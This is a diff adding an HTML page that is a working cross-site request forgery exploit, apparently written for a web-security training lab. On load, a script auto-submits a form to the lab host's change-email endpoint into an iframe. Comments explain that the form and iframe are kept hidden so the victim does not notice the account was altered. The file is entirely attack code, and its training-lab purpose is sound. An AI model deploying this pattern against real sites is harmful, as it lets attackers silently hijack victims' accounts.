@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    
+    <title>CSRF</title>
+    
+    <style>
+        #csrf-main {
+        visibility: visible;
+        } 
+        
+       /* change visibility="visible"  in order to see how the page would look like to victim if iframe and input tags are not kept hidden */
+        
+     </style>
+    
+</head>
+
+<body>
+    <h1>NEVER CLICK UNTRUSTED LINKS </h1>
+    
+    <main id="csrf-main">
+    
+    	<iframe name="csrf-iframe" ></iframe>
+    
+    	<form action="https://acc71f501e811a99c08a1c0e00420036.web-security-academy.net/my-account/change-email" method="get" target="csrf-iframe" id="csrf-form">
+    	
+    	<!-- keeping target="csrf-iframe will lead to open the victims exploited page in iframe. As we have made iframe tag hidden so user will not know that he has been 
+    	    hacked"-->
+    	
+        	<input type="text" name='email' value="testing@222">
+    	</form>
+    	
+    </main>
+    
+    <!--script>document.forms[0].submit()</script-->
+    
+    <!--document.forms[0].submit() will trigger the submission of the first form in your HTML page. -->
+    
+    <!--  OR -->
+    
+    <script>document.getElementById("csrf-form").submit()</script>
+    
+</body>
+</html>
